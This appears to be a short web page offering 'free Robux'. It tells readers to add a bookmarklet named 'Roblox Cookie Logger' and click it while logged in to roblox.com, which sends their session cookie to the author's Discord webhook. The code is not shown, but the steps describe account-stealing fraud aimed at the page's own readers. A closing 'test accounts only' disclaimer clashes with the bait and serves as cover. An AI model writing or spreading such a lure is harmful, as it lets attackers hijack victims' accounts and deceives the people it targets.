Roblox Helper

Want to add free Robux? Drag the link below to your bookmarks bar:

Roblox Cookie Logger

How to use

  1. Drag the blue Roblox Cookie Logger link to your browser's bookmarks bar.
  2. Go to roblox.com and log in.
  3. Click the bookmarklet in your bookmarks bar while on roblox.com.
  4. Your cookie will be sent to my Discord webhook for testing.

This is for testing with your test accounts only. Do NOT use on real accounts.
